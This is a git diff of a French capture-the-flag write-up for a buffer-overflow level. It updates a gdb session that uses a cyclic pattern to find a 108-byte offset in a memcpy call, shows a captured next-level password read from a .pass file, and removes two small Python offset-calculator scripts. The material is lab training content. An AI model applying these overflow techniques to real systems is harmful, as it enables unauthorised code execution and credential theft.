@@ -144,13 +144,13 @@ On va pouvoir faire notre exploit avec l'utilisation d'un [shellcode](https://sh
 `memcpy()` peux etre exploiter avec un buffer overflow sur argv[1] dans `setAnnotation(char*)` pour faire un appel sur `edx`
 
 ```
-(gdb) run AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz
-Starting program: /home/user/level9/level9 AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 
 Program received signal SIGSEGV, Segmentation fault.
 0x08048682 in main ()
 (gdb) info register eax
-eax            0x79597858       2035906648
+eax            0x41366441	1094083649
 ```
 
 On a trouver que l'offset de `eax` est a 108. Maintenant on va trouver l'adresse de notre buffer juste apres l'appel de `setAnnotation(char*)` (+131)
@@ -181,46 +181,3 @@ bonus0
 $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
-
-
-
-
-
-
-
-#!/usr/bin/env python3
-
-import sys
-
-
-if len(sys.argv) < 2:
-    sys.exit()
-
-arg = bytes.fromhex(sys.argv[1])
-result = arg.decode("ASCII")
-
-nb = 65
-if result.islower():
-    nb = nb + 6
-
-print("%s => offset = %d" % (result, (ord(result[0]) - nb) * 4))
-
-
-
-
-
-#!/usr/bin/env python3
-
-import sys
-
-
-if len(sys.argv) < 2:
-    sys.exit()
-
-result = bytes.fromhex(sys.argv[1]).decode("ASCII")
-
-nb = 65
-if result.islower():
-    nb = nb + 6
-
-print("%d" % ((ord(result[0]) - nb) * 4))
